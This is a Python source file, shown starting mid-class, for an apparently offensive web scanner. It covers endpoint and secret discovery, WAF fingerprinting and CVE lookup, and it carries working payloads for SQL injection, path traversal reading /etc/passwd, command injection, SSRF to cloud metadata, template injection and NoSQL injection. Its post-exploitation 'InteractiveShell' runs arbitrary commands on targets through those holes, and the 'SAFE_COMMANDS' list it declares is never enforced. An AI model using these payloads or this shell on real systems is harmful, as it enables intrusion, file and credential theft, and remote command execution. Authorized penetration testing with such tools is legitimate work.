    name: str
    severity: str
    method: str = "GET"
    path: str = ""
    payloads: List[Dict] = field(default_factory=list)
    matchers: List[Dict] = field(default_factory=list)
    cwe: str = ""
    owasp: str = ""
    cve: List[str] = field(default_factory=list)
    remediation: str = ""

class TemplateLoader:
    def __init__(self, directory: str):
        self.dir = directory
        self.templates: List[Template] = []

    def load(self) -> List[Template]:
        if not os.path.isdir(self.dir):
            log.warning(f"Template dir not found: {self.dir}")
            return []
        for fn in os.listdir(self.dir):
            if not fn.endswith(".json"):
                continue
            path = os.path.join(self.dir, fn)
            try:
                with open(path, encoding="utf-8") as f:
                    raw = json.load(f)
                items = raw if isinstance(raw, list) else [raw]
                for it in items:
                    self.templates.append(Template(**it))
            except Exception as e:
                log.warning(f"Template {fn} load error: {e}")
        log.info(f"Loaded {len(self.templates)} templates from {self.dir}")
        return self.templates

def match_template(resp: Optional[httpx.Response], matchers: List[Dict],
                   oob_hit: Optional[Dict] = None) -> Optional[str]:
    if resp is None:
        return None
    for m in matchers:
        t = m.get("type")
        if t == "status" and resp.status_code == m.get("value"):
            return f"status={m['value']}"
        if t == "word" and m.get("value", "").lower() in resp.text.lower():
            return f"word='{m['value']}'"
        if t == "regex" and re.search(m.get("value", ""), resp.text, re.I):
            return f"regex='{m['value']}'"
        if t == "oob" and oob_hit is not None:
            return f"oob={oob_hit.get('protocol', '?')} from {oob_hit.get('remote-address', '?')}"
    return None

async def run_template(tpl: Template, base_url: str, client: AsyncClient,
                       oob: Optional[OOBClient], scope: List[str]) -> Optional[Finding]:
    corr = None
    if oob and any(p.get("value", "").startswith("{{OOB}}") for p in tpl.payloads):
        corr = oob.new_correlation_id()
    for pl in tpl.payloads:
        target_url = urljoin(base_url, tpl.path) if tpl.path else base_url
        if not is_in_scope(target_url, scope):
            continue
        params, data, headers = {}, {}, {}
        for p in tpl.payloads:
            key, val = p.get("name"), p.get("value", "")
            if corr:
                val = val.replace("{{OOB}}", corr)
            loc = p.get("in", "query")
            if loc == "query":
                params[key] = val
            if loc == "body":
                data[key] = val
            if loc == "header":
                headers[key] = val
        if tpl.method.upper() == "GET":
            r = await client.get(target_url, params=params, headers=headers)
        else:
            r = await client.post(target_url, params=params, data=data, headers=headers)
        oob_hit = None
        if corr and oob:
            oob_hit = await oob.wait_for_hit(corr, client.client)
        matched = match_template(r, tpl.matchers, oob_hit)
        if matched:
            return Finding(
                vuln_type=tpl.name, endpoint=target_url, severity=tpl.severity,
                cvss_score=SEVERITY_MAP[tpl.severity]["cvss"],
                details=f"Template '{tpl.id}' matched: {matched}",
                evidence=matched[:300], cwe_id=tpl.cwe, owasp_category=tpl.owasp,
                cve_ids=tpl.cve, remediation=tpl.remediation, template_id=tpl.id)
    return None

# ==============================================================================
# SCOPE (hardened: wildcard, CIDR, regex)
# ==============================================================================
def validate_authorization(args) -> bool:
    if not args.authorized:
        log.error("⛔ --authorized is required.")
        return False
    if not args.authorization_ref:
        log.warning("⚠️  --authorization-ref empty (recommended).")
    return True

@lru_cache(maxsize=2048)
def _compile_scope(entries: tuple):
    hosts, cidrs, regexes = [], [], []
    for e in entries:
        e = e.strip().lower()
        if not e:
            continue
        try:
            cidrs.append(ipaddress.ip_network(e, strict=False))
            continue
        except ValueError:
            pass
        if e.startswith("re:"):
            try:
                regexes.append(re.compile(e[3:]))
            except re.error as ex:
                log.warning(f"Invalid scope regex '{e[3:]}': {ex}")
            continue
        hosts.append(e)
    return hosts, cidrs, regexes

def is_in_scope(url: str, scope_list: List[str]) -> bool:
    if not scope_list:
        return True
    parsed = urlparse(url)
    host = (parsed.hostname or "").lower()
    hosts, cidrs, regexes = _compile_scope(tuple(scope_list))
    for s in hosts:
        if s == host:
            return True
        if s.startswith("*.") and host.endswith(s[1:]):
            return True
        if host.endswith("." + s):
            return True
    try:
        ip = ipaddress.ip_address(host)
        if any(ip in n for n in cidrs):
            return True
    except ValueError:
        pass
    for rgx in regexes:
        try:
            if rgx.search(url):
                return True
        except Exception:
            pass
    return False

# ==============================================================================
# [2] DEEP ENDPOINT DISCOVERY — Sitemap, JS, Swagger/OpenAPI
# ==============================================================================
class SitemapParser:
    """Parse sitemap.xml + sitemap index, robots.txt."""
    @staticmethod
    async def from_robots(client: "AsyncClient", base_url: str) -> Set[str]:
        out = set()
        try:
            r = await client.get(urljoin(base_url, "/robots.txt"))
            if r and r.status_code == 200:
                for line in r.text.splitlines():
                    if line.lower().startswith(("sitemap:", "disallow:", "allow:")):
                        path = line.split(":", 1)[1].strip()
                        if path and path != "/":
                            out.add(urljoin(base_url, path))
        except Exception:
            pass
        return out

    @staticmethod
    async def from_sitemaps(client: "AsyncClient", base_url: str,
                            max_urls: int = 2000) -> Set[str]:
        out: Set[str] = set()
        queue = [urljoin(base_url, "/sitemap.xml"), urljoin(base_url, "/sitemap_index.xml")]
        seen_sitemaps = set()
        while queue and len(out) < max_urls:
            sm = queue.pop(0)
            if sm in seen_sitemaps:
                continue
            seen_sitemaps.add(sm)
            try:
                r = await client.get(sm)
                if not r or r.status_code != 200:
                    continue
                try:
                    root = ET.fromstring(r.content)
                except ET.ParseError:
                    continue
                ns = {"sm": "http://www.sitemaps.org/schemas/sitemap/0.9"}
                for loc in root.findall(".//sm:sitemap/sm:loc", ns):
                    queue.append(loc.text.strip())
                for loc in root.findall(".//sm:url/sm:loc", ns):
                    out.add(loc.text.strip())
                    if len(out) >= max_urls:
                        break
            except Exception:
                continue
        return out

class JSParser:
    """Extract endpoints/secrets from JS bundles."""
    ENDPOINT_PATTERNS = [
        r'["\']((?:/api/|/v\d+/|/rest/|/graphql)[\w\-./?=&%{}:]+)["\']',
        r'(?:fetch|axios\.\w+|\.open)\(\s*["\']([^"\']+)["\']',
        r'["\'](/[\w\-./]+\.json)["\']',
        r'["\'](/[\w\-./]+\.php)["\']',
    ]
    SECRET_PATTERNS = {
        "aws_key":     r"AKIA[0-9A-Z]{16}",
        "google_api":  r"AIza[0-9A-Za-z\-_]{35}",
        "stripe":      r"sk_live_[0-9a-zA-Z]{24,}",
        "jwt":         r"eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+",
        "private_key": r"-----BEGIN (?:RSA |EC )?PRIVATE KEY-----",
        "slack":       r"xox[baprs]-[0-9a-zA-Z\-]{10,}",
    }

    @classmethod
    def extract_endpoints(cls, js_text: str, base_url: str) -> Set[str]:
        out = set()
        for pat in cls.ENDPOINT_PATTERNS:
            for m in re.finditer(pat, js_text):
                path = m.group(1)
                if path.startswith(("http://", "https://")):
                    out.add(path)
                elif path.startswith("/"):
                    out.add(urljoin(base_url, path))
        return out

    @classmethod
    def extract_secrets(cls, js_text: str) -> List[Dict]:
        hits = []
        for name, pat in cls.SECRET_PATTERNS.items():
            for m in re.finditer(pat, js_text):
                hits.append({"type": name, "match": m.group(0)[:80]})
        return hits

class SwaggerParser:
    """Detect & parse Swagger 2.0 / OpenAPI 3.x."""
    CANDIDATES = [
        "/swagger.json", "/openapi.json", "/api-docs", "/api-docs.json",
        "/v2/api-docs", "/v3/api-docs", "/swagger/v1/swagger.json",
        "/swagger-resources", "/api/swagger.json",
    ]

    @classmethod
    async def discover(cls, client: "AsyncClient", base_url: str) -> List[Dict]:
        for path in cls.CANDIDATES:
            url = urljoin(base_url, path)
            r = await client.get(url)
            if not r or r.status_code != 200:
                continue
            try:
                spec = r.json()
            except Exception:
                continue
            if not isinstance(spec, dict):
                continue
            if "swagger" in spec or "openapi" in spec:
                return cls._parse_spec(spec, base_url, url)
        return []

    @classmethod
    def _parse_spec(cls, spec: Dict, base_url: str, spec_url: str) -> List[Dict]:
        endpoints = []
        paths = spec.get("paths", {}) or {}
        base_path = spec.get("basePath", "") or ""
        for path, methods in paths.items():
            if not isinstance(methods, dict):
                continue
            for method, op in methods.items():
                if method.upper() not in ("GET", "POST", "PUT", "DELETE", "PATCH"):
                    continue
                full = urljoin(base_url, base_path + path)
                params = []
                for p in (op.get("parameters") or []):
                    if "name" in p:
                        params.append({"name": p["name"], "in": p.get("in", "query")})
                endpoints.append({
                    "url": full, "method": method.upper(),
                    "params": params, "spec_url": spec_url,
                })
        return endpoints

class EndpointDiscoverer:
    """Orchestrates all discovery sources into one unified endpoint list."""
    def __init__(self, client: "AsyncClient", base_url: str,
                 state: Optional["ScanStateDB"] = None):
        self.client = client
        self.base_url = base_url
        self.state = state

    async def discover(self) -> Dict[str, Any]:
        log.info("[Discover] Starting deep endpoint discovery...")
        result = {"sitemap": set(), "js_endpoints": set(),
                  "swagger": [], "secrets": [], "robots": set()}

        result["robots"] = await SitemapParser.from_robots(self.client, self.base_url)
        log.info(f"[Discover] robots.txt → {len(result['robots'])} entries")

        result["sitemap"] = await SitemapParser.from_sitemaps(self.client, self.base_url)
        log.info(f"[Discover] sitemap → {len(result['sitemap'])} URLs")

        result["swagger"] = await SwaggerParser.discover(self.client, self.base_url)
        log.info(f"[Discover] Swagger/OpenAPI → {len(result['swagger'])} endpoints")

        js_urls = set()
        for u in (result["sitemap"] | result["robots"]) | {self.base_url}:
            r = await self.client.get(u)
            if not r or r.status_code != 200:
                continue
            try:
                soup = BeautifulSoup(r.text, "html.parser")
                for tag in soup.find_all("script", src=True):
                    js_urls.add(urljoin(self.base_url, tag["src"]))
            except Exception:
                continue
        log.info(f"[Discover] JS bundles found: {len(js_urls)}")

        for js_url in list(js_urls)[:30]:
            r = await self.client.get(js_url)
            if not r or r.status_code != 200:
                continue
            result["js_endpoints"] |= JSParser.extract_endpoints(r.text, self.base_url)
            sec = JSParser.extract_secrets(r.text)
            if sec:
                for s in sec:
                    s["source"] = js_url
                result["secrets"].extend(sec)

        log.info(f"[Discover] JS endpoints → {len(result['js_endpoints'])}, "
                 f"secrets → {len(result['secrets'])}")

        if self.state:
            for u in result["sitemap"] | result["js_endpoints"] | result["robots"]:
                self.state.mark_visited(u, 0, "")

        return result

    def secrets_to_findings(self, secrets: List[Dict]) -> List["Finding"]:
        out = []
        for s in secrets:
            sev = "Critical" if s["type"] in ("aws_key", "private_key", "stripe") else "High"
            out.append(Finding(
                vuln_type=f"Secret Leaked in JS ({s['type']})",
                endpoint=s.get("source", self.base_url),
                severity=sev,
                cvss_score=SEVERITY_MAP[sev]["cvss"],
                details=f"Client-side JS exposes {s['type']} secret.",
                evidence=s["match"][:60],
                cwe_id="CWE-798",
                owasp_category="A07:2021",
                remediation="Rotate leaked credential immediately; move secrets server-side."
            ))
        return out

# ==============================================================================
# [3] INTERACTIVE SHELL — safe post-exploitation for confirmed RCE/SQLi/LFI
# ==============================================================================
class InteractiveShell:
    """
    Post-exploitation console for CONFIRMED vulnerabilities only.
    Requires explicit --interactive-shell or --os-cmd flag.
    """
    SAFE_COMMANDS = {
        "whoami", "id", "uname -a", "hostname", "pwd", "ls", "dir",
        "cat /etc/passwd", "cat /etc/hostname", "ifconfig", "ip a",
        "net user", "systeminfo", "env", "printenv",
    }

    def __init__(self, vuln_type: str, url: str, param: str, client: "AsyncClient"):
        self.vuln_type = vuln_type.lower()
        self.url = url
        self.param = param
        self.client = client
        self.session_log: List[Dict] = []

    def _log(self, cmd: str, result: str):
        self.session_log.append({
            "ts": datetime.datetime.now().isoformat(),
            "cmd": cmd, "result": result[:2000]
        })

    async def _execute_cmdi(self, cmd: str) -> str:
        for sep in (";", "|", "&"):
            payload = f"{sep}{cmd}"
            r = await self.client.get(f"{self.url}?{urlencode({self.param: payload})}")
            if r and cmd.split()[0] in r.text:
                return r.text[:3000]
        return "[no output — command may have failed or output filtered]"

    async def _execute_sqli(self, query: str) -> str:
        payload = f"1' UNION SELECT {query},NULL,NULL-- -"
        r = await self.client.get(f"{self.url}?{urlencode({self.param: payload})}")
        if r:
            return r.text[:3000]
        return "[no output]"

    async def _execute_lfi(self, path: str) -> str:
        for trav in ("../../../../..", "..\\..\\..\\..\\.."):
            payload = f"{trav}{path}"
            r = await self.client.get(f"{self.url}?{urlencode({self.param: payload})}")
            if r and len(r.text) > 0 and "not found" not in r.text.lower():
                return r.text[:3000]
        return "[file not readable]"

    async def run_command(self, cmd: str) -> str:
        cmd = cmd.strip()
        if not cmd:
            return "[empty command]"
        if cmd.lower() in ("exit", "quit"):
            return "__EXIT__"
        if cmd.lower() == "help":
            return (
                "Commands:\n"
                "  whoami, id, uname -a, hostname, pwd, ls\n"
                "  cat /etc/passwd  (LFI)\n"
                "  sql <SELECT query>  (SQLi)\n"
                "  read <path>  (LFI)\n"
                "  log  — show session log\n"
                "  exit — quit shell\n"
            )
        if cmd.lower() == "log":
            return json.dumps(self.session_log, indent=2)

        try:
            if cmd.lower().startswith("sql "):
                out = await self._execute_sqli(cmd[4:].strip())
            elif cmd.lower().startswith("read "):
                out = await self._execute_lfi(cmd[5:].strip())
            elif self.vuln_type in ("rce", "cmdi", "command injection"):
                out = await self._execute_cmdi(cmd)
            elif self.vuln_type == "lfi":
                out = await self._execute_lfi(cmd)
            elif self.vuln_type == "sqli":
                out = await self._execute_sqli(cmd)
            else:
                return f"[unsupported vuln type: {self.vuln_type}]"
        except Exception as e:
            return f"[error: {e}]"

        self._log(cmd, out)
        return out

    async def run_single(self, cmd: str) -> str:
        return await self.run_command(cmd)

    async def interactive_loop(self):
        """Async REPL with fallback to sync input."""
        print(f"\n=== Interactive Shell ({self.vuln_type}) @ {self.url} param={self.param} ===")
        print("Type 'help' for commands, 'exit' to quit.\n")
        loop = asyncio.get_event_loop()
        while True:
            try:
                cmd = await loop.run_in_executor(None, input, "shell> ")
            except (EOFError, KeyboardInterrupt):
                break
            out = await self.run_command(cmd)
            if out == "__EXIT__":
                break
            print(out)

# ==============================================================================
# [4] WORDLIST & PLUGIN SYSTEM
# ==============================================================================
class WordlistLoader:
    """Load params/payloads from SecLists-style files."""
    DEFAULT_PARAMS = [
        "id", "cat", "page", "q", "s", "file", "url", "dir", "search", "cmd",
        "lang", "redirect", "next", "return", "view", "path", "debug", "test",
        "action", "type", "name", "email", "user", "pass", "token", "callback",
    ]

    @classmethod
    def load_params(cls, path: Optional[str]) -> List[str]:
        if not path or not os.path.exists(path):
            return list(cls.DEFAULT_PARAMS)
        with open(path, encoding="utf-8", errors="ignore") as f:
            return [ln.strip() for ln in f if ln.strip() and not ln.startswith("#")]

    @classmethod
    def load_payloads(cls, directory: Optional[str]) -> Dict[str, List[str]]:
        out = defaultdict(list)
        if not directory or not os.path.isdir(directory):
            return out
        for fn in os.listdir(directory):
            if not fn.endswith(".txt"):
                continue
            kind = fn.replace(".txt", "").lower()
            with open(os.path.join(directory, fn), encoding="utf-8", errors="ignore") as f:
                out[kind] = [ln.rstrip("\n") for ln in f
                             if ln.strip() and not ln.startswith("#")]
        log.info(f"[Wordlist] Loaded payload classes: {list(out.keys())}")
        return out

    @classmethod
    def load_sensitive_paths(cls, path: Optional[str]) -> List[str]:
        if not path or not os.path.exists(path):
            return []
        with open(path, encoding="utf-8", errors="ignore") as f:
            return ["/" + ln.strip().lstrip("/") for ln in f
                    if ln.strip() and not ln.startswith("#")]

class PluginManager:
    """Load external Python plugins from a directory."""
    def __init__(self, plugin_dir: Optional[str]):
        self.plugin_dir = plugin_dir
        self.plugins: List[Any] = []

    def load(self):
        if not self.plugin_dir or not os.path.isdir(self.plugin_dir):
            return []
        sys.path.insert(0, self.plugin_dir)
        for fn in os.listdir(self.plugin_dir):
            if not fn.endswith(".py") or fn.startswith("_"):
                continue
            mod_name = fn[:-3]
            try:
                mod = __import__(mod_name)
                if hasattr(mod, "Plugin"):
                    plugin = mod.Plugin()
                    self.plugins.append(plugin)
                    log.info(f"[Plugin] Loaded: {getattr(plugin, 'name', mod_name)}")
            except Exception as e:
                log.warning(f"[Plugin] Failed to load {fn}: {e}")
        return self.plugins

    async def run_all(self, client: "AsyncClient", url: str, params: List[str],
                      findings: List["Finding"]):
        for plugin in self.plugins:
            try:
                for p in params:
                    f = await plugin.check(client, url, p)
                    if isinstance(f, Finding):
                        _add(findings, f)
            except Exception as e:
                log.debug(f"[Plugin] {plugin} error: {e}")

# ==============================================================================
# RECON
# ==============================================================================
def detect_waf_sync(client: StealthClient, url: str) -> str:
    sigs = {"Cloudflare": ["cloudflare", "cf-ray"], "AWS WAF": ["x-amz-cf-id"],
            "Akamai": ["akamai"], "Imperva": ["incap_ses"], "Sucuri": ["x-sucuri-id"],
            "F5 BIG-IP": ["bigip"], "ModSecurity": ["mod_security"]}
    r = client.get(url)
    if not r:
        return "Unknown"
    blob = (" ".join(f"{k}:{v}" for k, v in r.headers.items()) + r.text[:2000]).lower()
    for w, s in sigs.items():
        if any(x in blob for x in s):
            return w
    return "None detected"

def fingerprint_sync(client: StealthClient, url: str) -> Dict:
    r = client.get(url)
    if not r:
        return {"error": "unreachable"}
    info = {"server": r.headers.get("Server", "Unknown"),
            "powered_by": r.headers.get("X-Powered-By", "Unknown"),
            "cms": "Custom / Unknown", "versions": {}}
    html = r.text.lower()
    patterns = {"WordPress": ["wp-content", "wp-includes"], "Joomla": ["joomla"],
                "Drupal": ["drupal"], "Magento": ["magento"], "Laravel": ["laravel"],
                "Django": ["csrftoken"], "PrestaShop": ["prestashop"]}
    for c, sigs in patterns.items():
        if any(s in html for s in sigs):
            info["cms"] = c
            break
    vm = re.search(r'<meta name="generator" content="([^"]+?)\s*([\d.]+)"', r.text, re.I)
    if vm:
        info["versions"][vm.group(1).strip()] = vm.group(2)
    sm = re.search(r"Server:\s*([A-Za-z\-/]+)\s*([\d.]+)", str(r.headers), re.I)
    if sm:
        info["versions"][sm.group(1)] = sm.group(2)
    info["missing_security_headers"] = [
        h for h in ["X-Frame-Options", "X-Content-Type-Options",
                    "Strict-Transport-Security", "Content-Security-Policy",
                    "Referrer-Policy", "Permissions-Policy"]
        if h not in r.headers]
    return info

# ==============================================================================
# CVE MATCHING
# ==============================================================================
class CVELookup:
    def __init__(self, cache_path: str = "cve_cache.json", use_live: bool = False):
        self.cache_path = cache_path
        self.use_live = use_live
        self.cache: Dict[str, List[Dict]] = {}
        if os.path.exists(cache_path):
            try:
                self.cache = json.load(open(cache_path, encoding="utf-8"))
            except Exception:
                self.cache = {}

    def save(self):
        try:
            json.dump(self.cache, open(self.cache_path, "w", encoding="utf-8"), indent=2)
        except Exception as e:
            log.debug(f"CVE cache save failed: {e}")

    def lookup(self, tech: str, version: str) -> List[Dict]:
        key = f"{tech.lower()}:{version}"
        if key in self.cache:
            return self.cache[key]
        if not self.use_live:
            return []
        try:
            r = requests.get("https://services.nvd.nist.gov/rest/json/cves/2.0",
                             params={"keywordSearch": f"{tech} {version}",
                                     "resultsPerPage": 20}, timeout=15)
            data = r.json()
            out = []
            for item in data.get("vulnerabilities", []):
                cve = item.get("cve", {})
                cid = cve.get("id", "")
                metrics = cve.get("metrics", {}).get("cvssMetricV31") or \
                          cve.get("metrics", {}).get("cvssMetricV30") or []
                score = 0.0
                if metrics:
                    score = metrics[0].get("cvssData", {}).get("baseScore", 0.0)
                desc = (cve.get("descriptions") or [{}])[0].get("value", "")[:200]
                out.append({"id": cid, "score": score, "desc": desc})
            time.sleep(6)
            self.cache[key] = out
            return out
        except Exception as e:
            log.debug(f"NVD lookup failed for {tech} {version}: {e}")
            return []

def correlate_cves(cms_info: Dict, cve: CVELookup) -> List[Dict]:
    matches = []
    for tech, ver in cms_info.get("versions", {}).items():
        for hit in cve.lookup(tech, ver):
            matches.append({"tech": tech, "version": ver, **hit})
    return matches

# ==============================================================================
# [D] SAFE POC VERIFICATION
# ==============================================================================
SAFE_FILES = ["/etc/passwd", "/etc/hostname", "C:\\Windows\\win.ini"]
DB_VERSION_SIGS = [
    r"(\d+\.\d+\.\d+[-\w.]+)",
    r"PostgreSQL\s+([\d.]+)",
    r"MySQL\s+([\d.]+)",
    r"Microsoft SQL Server\s+([\d.]+)",
    r"(\d+\.\d+\.\d+-MariaDB)",
]
PASSWD_MARKERS = ["root:x:0:0", "daemon:x:1", "nobody:x:"]
INI_MARKERS = ["[fonts]", "[extensions]", "[mci extensions]"]

def _extract_version(text: str) -> Optional[str]:
    for sig in DB_VERSION_SIGS:
        m = re.search(sig, text, re.I)
        if m:
            return m.group(1)
    return None

def _has_file_marker(text: str) -> Optional[str]:
    for m in PASSWD_MARKERS:
        if m in text:
            return m
    for m in INI_MARKERS:
        if m in text:
            return m
    return None

async def verify_sqli(client, url: str, param: str) -> Optional[str]:
    probes = [
        "1' UNION SELECT @@version,2,3-- -",
        "1 UNION SELECT @@version-- -",
        "1' UNION SELECT version(),2,3-- -",
        "1' UNION SELECT banner,2,3 FROM v$version-- -",
    ]
    for probe in probes:
        target = f"{url}?{urlencode({param: probe})}"
        r = await client.get(target)
        if not r:
            continue
        ver = _extract_version(r.text)
        if ver:
            return f"DB version disclosed: {ver} (payload={probe})"
    return None

async def verify_lfi(client, url: str, param: str) -> Optional[str]:
    for path in SAFE_FILES:
        for trav in ("../../../../..", "..\\..\\..\\..\\.."):
            payload = f"{trav}{path}"
            target = f"{url}?{urlencode({param: payload})}"
            r = await client.get(target)
            if not r:
                continue
            marker = _has_file_marker(r.text)
            if marker:
                return f"File read confirmed ({path}) — marker '{marker}'"
    return None

async def verify_cmdi(client, url: str, param: str) -> Optional[str]:
    probes = [(";id", r"uid=\d+\(\w+\)"), ("|id", r"uid=\d+\(\w+\)"),
              (";whoami", r"^(root|www-data|apache|nginx|nobody)$"),
              ("&whoami", r"^(root|www-data|apache|nginx|nobody)$")]
    for probe, sig in probes:
        target = f"{url}?{urlencode({param: probe})}"
        r = await client.get(target)
        if not r:
            continue
        m = re.search(sig, r.text, re.M)
        if m:
            return f"Command executed: '{m.group(0)}' (payload={probe})"
    return None

async def verify_ssrf_internal(client, url: str, param: str) -> Optional[str]:
    targets = [
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/computeMetadata/v1/",
    ]
    for t in targets:
        target = f"{url}?{urlencode({param: t})}"
        r = await client.get(target)
        if r and any(k in r.text for k in ("ami-id", "instance-id", "project")):
            return f"SSRF to cloud metadata succeeded (payload={t})"
    return None

# ==============================================================================
# VULN CHECKS
# ==============================================================================
def _add(findings, f):
    findings.append(f)
    log.warning(f"[{f.severity.upper()}] {f.vuln_type} @ {f.endpoint}")

async def check_sensitive_files(client: AsyncClient, base_url, findings, scope):
    files = [(".env", "Critical", "CWE-538", "Env file exposed"),
             (".git/HEAD", "Critical", "CWE-538", "Git repo exposed"),
             ("backup.zip", "High", "CWE-538", "Backup archive exposed"),
             ("config.php.bak", "High", "CWE-538", "Backup config exposed"),
             ("database.sql", "Critical", "CWE-538", "SQL dump exposed"),
             ("phpinfo.php", "Medium", "CWE-200", "phpinfo exposed"),
             ("robots.txt", "Info", "CWE-200", "robots.txt"),
             ("xmlrpc.php", "Info", "CWE-200", "xmlrpc.php")]
    for path, sev, cwe, desc in files:
        url = urljoin(base_url, path)
        if not is_in_scope(url, scope):
            continue
        r = await client.get(url)
        if r and r.status_code == 200 and len(r.content) > 0:
            _add(findings, Finding(vuln_type=f"Exposed {path}", endpoint=url,
                severity=sev, cvss_score=SEVERITY_MAP[sev]["cvss"], details=desc,
                evidence=f"HTTP 200, {len(r.content)}b", cwe_id=cwe,
                owasp_category="A05:2021",
                remediation="Restrict via server config/WAF."))

async def test_sqli(client, url, param, findings, scope, evasion: EvasionEngine,
                    verify_poc: bool = False, payload_db: Optional[Dict[str, List[str]]] = None):
    raw_payloads = ["'", "\"", "')", "1' AND SLEEP(3)-- -",
                    "1' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--"]
    if payload_db and payload_db.get("sqli"):
        raw_payloads = list(payload_db["sqli"]) + raw_payloads
    errs = ["sql syntax", "mysql_fetch", "unclosed quotation",
            "pg_query", "ora-", "odbc sql"]
    for p in raw_payloads:
        for variant in evasion.variants(p, kind="sqli"):
            target = f"{url}?{urlencode({param: variant})}"
            if not is_in_scope(target, scope):
                continue
            t0 = time.time()
            r = await client.get(target)
            dt = time.time() - t0
            if not r:
                continue
            if any(e in r.text.lower() for e in errs):
                poc = await verify_sqli(client, url, param) if verify_poc else None
                _add(findings, Finding(
                    "SQL Injection (Error-Based)", target, "Critical", 9.8,
                    f"Param '{param}' error-based SQLi.",
                    poc or f"payload={variant}", cwe_id="CWE-89",
                    owasp_category="A03:2021",
                    remediation="Parameterized queries."))
                return
            if "SLEEP" in variant and dt > 2.8:
                poc = await verify_sqli(client, url, param) if verify_poc else None
                _add(findings, Finding(
                    "SQL Injection (Time-Based)", target, "Critical", 9.8,
                    f"Param '{param}' time-based SQLi (delay {dt:.1f}s).",
                    poc or f"delay={dt:.2f}s", cwe_id="CWE-89",
                    owasp_category="A03:2021",
                    remediation="Parameterized queries + input validation."))
                return

async def test_xss(client, url, param, findings, scope, evasion: EvasionEngine):
    raw = "<svg/onload=alert('RTX')>"
    for variant in evasion.variants(raw, kind="xss"):
        target = f"{url}?{urlencode({param: variant})}"
        if not is_in_scope(target, scope):
            continue
        r = await client.get(target)
        if r and variant in r.text:
            _add(findings, Finding("Reflected XSS", target, "High", 6.1,
                f"Param '{param}' reflects unencoded payload.",
                f"payload in response: {variant[:80]}",
                cwe_id="CWE-79", owasp_category="A03:2021",
                remediation="Context-aware output encoding + CSP."))
            return

async def test_lfi(client, url, param, findings, scope, evasion: EvasionEngine,
                   verify_poc: bool = False):
    checks = [("../../../../etc/passwd", "root:x:"),
              ("..\\..\\..\\..\\windows\\win.ini", "[extensions]"),
              ("php://filter/convert.base64-encode/resource=index.php", "PD9w")]
    for p, sig in checks:
        for variant in evasion.variants(p, kind="lfi"):
            target = f"{url}?{urlencode({param: variant})}"
            if not is_in_scope(target, scope):
                continue
            r = await client.get(target)
            if r and sig in r.text:
                poc = await verify_lfi(client, url, param) if verify_poc else None
                _add(findings, Finding("Local File Inclusion", target, "Critical", 9.1,
                    f"Param '{param}' LFI.", poc or f"sig='{sig}'",
                    cwe_id="CWE-98", owasp_category="A03:2021",
                    remediation="Whitelist + disable wrappers."))
                return

async def test_rfi(client, url, param, findings, scope, oob: Optional[OOBClient]):
    if not oob:
        return
    corr = oob.new_correlation_id()
    payload = oob.make_url(corr)
    target = f"{url}?{urlencode({param: payload})}"
    if not is_in_scope(target, scope):
        return
    await client.get(target)
    hit = await oob.wait_for_hit(corr, client.client)
    if hit:
        _add(findings, Finding("Remote File Inclusion (OOB)", target, "Critical", 9.8,
            f"Param '{param}' triggers external fetch.", f"OOB {hit.get('protocol')}",
            cwe_id="CWE-98", owasp_category="A03:2021",
            remediation="Disable allow_url_include; whitelist includes."))

async def test_ssrf(client, url, param, findings, scope, oob: Optional[OOBClient],
                    verify_poc: bool = False):
    if oob:
        corr = oob.new_correlation_id()
        payload = oob.make_url(corr)
        target = f"{url}?{urlencode({param: payload})}"
        if is_in_scope(target, scope):
            await client.get(target)
            hit = await oob.wait_for_hit(corr, client.client)
            if hit:
                _add(findings, Finding("SSRF (OOB)", target, "Critical", 9.1,
                    f"Param '{param}' performs server-side request.",
                    f"OOB from {hit.get('remote-address','?')}",
                    cwe_id="CWE-918", owasp_category="A10:2021",
                    remediation="Allowlist egress destinations."))
                return
    if verify_poc:
        poc = await verify_ssrf_internal(client, url, param)
        if poc:
            target = f"{url}?{urlencode({param: 'cloud-metadata'})}"
            _add(findings, Finding("SSRF (PoC-Verified)", target, "Critical", 9.1,
                f"Param '{param}' SSRF confirmed.", poc, cwe_id="CWE-918",
                owasp_category="A10:2021",
                remediation="Allowlist egress destinations."))

async def test_ssti(client, url, param, findings, scope, evasion: EvasionEngine):
    payloads = [("{{7*7}}", "49"), ("${7*7}", "49"), ("#{7*7}", "49"),
                ("<%= 7*7 %>", "49")]
    for p, sig in payloads:
        for variant in evasion.variants(p, kind="ssti"):
            target = f"{url}?{urlencode({param: variant})}"
            if not is_in_scope(target, scope):
                continue
            r = await client.get(target)
            if r and sig in r.text and variant not in r.text:
                _add(findings, Finding("Server-Side Template Injection", target,
                    "Critical", 9.8,
                    f"Param '{param}' template-evaluated.",
                    f"payload={variant} -> {sig}",
                    cwe_id="CWE-1336", owasp_category="A03:2021",
                    remediation="Do not render user input in templates; sandbox engine."))
                return

async def test_cmdi(client, url, param, findings, scope, oob: Optional[OOBClient],
                    evasion: Optional[EvasionEngine] = None, verify_poc: bool = False):
    payloads = [(";sleep 3", 2.8), ("|sleep 3", 2.8),
                ("`sleep 3`", 2.8), ("$(sleep 3)", 2.8)]
    for p, thresh in payloads:
        variants = evasion.variants(p, kind="cmdi") if evasion else [p]
        for variant in variants:
            target = f"{url}?{urlencode({param: variant})}"
            if not is_in_scope(target, scope):
                continue
            t0 = time.time()
            await client.get(target)
            if time.time() - t0 > thresh:
                poc = await verify_cmdi(client, url, param) if verify_poc else None
                _add(findings, Finding("Command Injection (Time-Based)", target,
                    "Critical", 9.8,
                    f"Param '{param}' delays response.",
                    poc or f"payload={variant}", cwe_id="CWE-78",
                    owasp_category="A03:2021",
                    remediation="Never pass user input to shell; use safe APIs."))
                return

async def test_nosqli(client, url, param, findings, scope):
    payloads = [('{"$ne": null}', "neq"), ('{"$gt": ""}', "gt"),
                ("[$ne]=1", "array")]
    for p, sig in payloads:
        target = f"{url}?{urlencode({param: p})}"
        if not is_in_scope(target, scope):
            continue
        r = await client.get(target)
        if r and r.status_code == 200 and ("error" not in r.text.lower()) \
                and len(r.text) > 200:
            t2 = f"{url}?{urlencode({param: 'definitely_not_a_real_value'})}"
            r2 = await client.get(t2)
            if r2 and abs(len(r.text) - len(r2.text)) > 200:
                _add(findings, Finding("NoSQL Injection (Heuristic)", target,
                    "High", 7.5,
                    f"Param '{param}' mongo-operator injection suspicious.",
                    f"payload={p}", cwe_id="CWE-943",
                    owasp_category="A03:2021",
                    remediation="Type-check inputs; disable operator expansion."))
                return

